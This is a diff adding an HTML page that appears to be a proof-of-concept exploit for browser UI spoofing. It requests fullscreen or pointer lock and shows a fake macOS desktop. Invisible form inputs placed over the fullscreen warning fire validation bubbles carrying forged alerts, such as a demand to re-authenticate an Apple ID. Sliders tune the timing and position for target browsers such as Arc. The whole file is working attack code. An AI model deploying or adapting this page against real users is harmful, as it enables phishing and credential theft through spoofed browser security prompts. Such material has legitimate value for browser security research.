@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Validation Bubble Fullscreen Splice (Arc Browser Target)</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #1a1a1c;
+            color: white;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        #fake-os {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Mac_OS_X_Lion_Desktop.png/1200px-Mac_OS_X_Lion_Desktop.png');
+            background-size: cover;
+            background-position: center;
+            z-index: 10;
+        }
+
+        .panel {
+            background: #2a2a2d;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            z-index: 50;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            max-width: 500px;
+        }
+
+        h2 { margin-top: 0; color: #ff3b30; }
+
+        .btn {
+            background: #0a84ff;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+        .btn:hover { background: #0070e0; }
+
+        .stealth-anchor-container {
+            position: fixed;
+            top: -5px; /* Default for Chrome/Edge */
+            left: 50%; /* Default center */
+            transform: translateX(-50%);
+            z-index: 9999;
+            pointer-events: none;
+            opacity: 0.01;
+        }
+
+        .stealth-anchor-container input {
+            display: block;
+            width: 250px; 
+            height: 10px;
+            margin: 0; padding: 0; border: none;
+        }
+
+        .controls {
+            margin-top: 20px;
+            text-align: left;
+            background: #111;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #30d158;
+            font-size: 13px;
+        }
+        
+        .controls input[type="range"] {
+            width: 100%; margin: 8px 0 15px 0; cursor: pointer;
+        }
+        .val-text { font-family: monospace; color: #30d158; font-weight: bold; float: right; font-size: 14px;}
+        
+        .arc-tip {
+            font-size: 12px; color: #ff9f0a; font-style: italic; margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="fake-os"></div>
+
+<div class="panel">
+    <h2>Form Validation Hijack (Targeted)</h2>
+    <p style="font-size: 14px;">Adjust the coordinates of the invisible input fields to match where your target browser (e.g. Arc, Chrome, Opera) spawns its Fullscreen warning.</p>
+    
+    <div class="controls">
+        <label>Race Delay: <span id="delay-val" class="val-text">100ms</span></label>
+        <input type="range" id="delay" min="0" max="1000" value="100" step="10">
+
+        <div class="arc-tip">💡 For Arc Browser: Set X Position to ~95% (Top-Right)</div>
+        <label>X Position (Left to Right): <span id="x-val" class="val-text">50%</span></label>
+        <input type="range" id="x-pos" min="0" max="100" value="50">
+
+        <label>Y Position (Top to Bottom offset): <span id="y-val" class="val-text">-5px</span></label>
+        <input type="range" id="y-pos" min="-50" max="50" value="-5">
+
+        <hr style="border: 0; border-top: 1px solid #333; margin: 15px 0;">
+        <label style="display: block; margin-bottom: 10px; color: #ff9f0a; font-weight: bold;">Base Trap Target:</label>
+        <div style="display: flex; gap: 20px; font-size: 13px;">
+            <label style="cursor: pointer;"><input type="radio" name="trapType" value="fullscreen" checked> Fullscreen</label>
+            <label style="cursor: pointer;"><input type="radio" name="trapType" value="pointerlock"> Pointer Lock</label>
+            <label style="cursor: pointer;"><input type="radio" name="trapType" value="both"> Both (Double-Trap)</label>
+        </div>
+    </div>
+
+    <button class="btn" onclick="executeSpoof('url')">Launch URL Validation Spoof</button>
+    <button class="btn" onclick="executeSpoof('email')" style="background: #30d158; color: black;">Launch Email Validation Spoof</button>
+    <button class="btn" onclick="executeSpoof('number')" style="background: #ff9f0a; color: black;">Launch Number Validation Spoof</button>
+</div>
+
+<form class="stealth-anchor-container" id="anchor-box" onsubmit="return false;">
+    <input type="url" id="anchor-url" required value="invalid-url">
+    <input type="email" id="anchor-email" required value="invalid-email">
+    <input type="number" id="anchor-number" required max="10" value="100">
+</form>
+
+<script>
+    const fakeOs = document.getElementById('fake-os');
+    const delaySlider = document.getElementById('delay');
+    const xPosSlider = document.getElementById('x-pos');
+    const yPosSlider = document.getElementById('y-pos');
+    const anchorBox = document.getElementById('anchor-box');
+    
+    delaySlider.addEventListener('input', (e) => document.getElementById('delay-val').innerText = e.target.value + 'ms');
+    
+    xPosSlider.addEventListener('input', (e) => {
+        const val = e.target.value;
+        document.getElementById('x-val').innerText = val + '%';
+        anchorBox.style.left = val + '%';
+        anchorBox.style.transform = `translateX(-${val}%)`; 
+    });
+
+    yPosSlider.addEventListener('input', (e) => {
+        const val = e.target.value;
+        document.getElementById('y-val').innerText = val + 'px';
+        anchorBox.style.top = val + 'px';
+    });
+
+    document.addEventListener('fullscreenchange', () => {
+        if (document.fullscreenElement) {
+            fakeOs.style.display = 'block';
+        } else {
+            fakeOs.style.display = 'none';
+        }
+    });
+
+    async function executeSpoof(type) {
+        try {
+            const urlInput = document.getElementById('anchor-url');
+            const emailInput = document.getElementById('anchor-email');
+            const numberInput = document.getElementById('anchor-number');
+            
+            urlInput.setCustomValidity(''); 
+            emailInput.setCustomValidity(''); 
+            numberInput.setCustomValidity('');
+
+            let targetInput = null;
+
+            if (type === 'url') {
+                targetInput = urlInput;
+                targetInput.setCustomValidity("System Update Required: Press ALLOW to continue navigating securely.");
+            } else if (type === 'email') {
+                targetInput = emailInput;
+                targetInput.setCustomValidity("Authentication Error: Please re-authenticate the Apple ID to stay in Full Screen.");
+            } else if (type === 'number') {
+                targetInput = numberInput;
+                targetInput.setCustomValidity("Critical Alert: Arc Browser security boundary isolated. Press OK to restore connectivity.");
+            }
+
+            // Read the selected trap vector
+            const trapType = document.querySelector('input[name="trapType"]:checked').value;
+
+            // Trigger base traps
+            if (trapType === 'fullscreen' || trapType === 'both') {
+                await document.documentElement.requestFullscreen();
+            }
+            if (trapType === 'pointerlock' || trapType === 'both') {
+                try {
+                    await document.body.requestPointerLock();
+                } catch (pe) {
+                    console.warn("Pointer Lock failed:", pe);
+                }
+            }
+
+            // Fire the targeted validation bubble overlay
+            const delay = parseInt(delaySlider.value);
+            setTimeout(() => {
+                targetInput.reportValidity();
+                setTimeout(() => targetInput.setCustomValidity(''), 3000);
+            }, delay);
+
+        } catch (err) {
+            alert("Error: " + err.message);
+        }
+    }</script>
+
+</body>
+</html>
